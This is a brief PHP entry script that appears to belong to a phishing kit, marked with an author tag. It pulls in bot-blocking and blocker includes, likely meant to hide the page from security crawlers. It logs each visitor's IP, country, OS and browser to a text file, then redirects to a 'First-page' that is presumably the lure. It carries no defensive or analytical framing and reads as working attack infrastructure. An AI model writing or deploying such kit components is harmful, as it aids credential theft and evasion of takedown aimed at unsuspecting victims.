<?php
/*   
Mou-Ad                    
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();  
include "./antibots.php";
include "./blocker.php";
include "./om.php";
$file = fopen("../vu.txt","a");
fwrite($file,$ip2."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$cn | $os | $br] \n");

header("LOCATION: First-page");
?>